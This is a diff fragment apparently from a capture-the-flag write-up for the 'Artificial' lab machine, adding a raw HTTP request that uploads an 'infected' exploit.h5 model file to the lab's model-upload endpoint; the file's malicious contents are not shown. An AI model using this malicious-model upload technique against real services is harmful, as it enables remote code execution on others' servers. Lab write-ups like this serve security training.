@@ -208,3 +208,26 @@ sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
 
 Once that's done, I upload the infected .h5:
+```
+POST /upload_model HTTP/1.1
+Host: artificial.htb
+Content-Length: 10149
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://artificial.htb
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTicDHAyJc5Hia94Y
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://artificial.htb/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
+Connection: keep-alive
+
+------WebKitFormBoundaryTicDHAyJc5Hia94Y
+Content-Disposition: form-data; name="model_file"; filename="exploit.h5"
+Content-Type: application/x-hdf
+
+HDF
+
+```
